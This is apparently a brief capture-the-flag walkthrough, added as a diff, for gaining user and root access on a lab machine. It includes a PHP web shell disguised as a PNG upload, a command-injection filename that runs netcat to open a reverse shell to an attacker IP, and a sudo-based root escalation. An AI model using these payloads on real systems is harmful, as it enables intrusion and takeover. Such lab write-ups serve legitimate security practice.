@@ -1,0 +1,9 @@
+                                                      USER
+
+/uploads.php and try uploading a png file. In burp intercept the requests and change the file ext to .php.png and content to <?php system($_GET[‘cmd’]); ?> . Keep the magic bytes of PNG.
+The execve function executes eveything in a shell so create a file with payload like “;nc 10.10.16.57 1234 -c bash” or like “;php file.php” to execute php rev shell as guly user.
+
+                                                    ROOT
+https://seclists.org/fulldisclosure/2019/Apr/24
+sudo -l 
+Type input as admin bash to get root shell
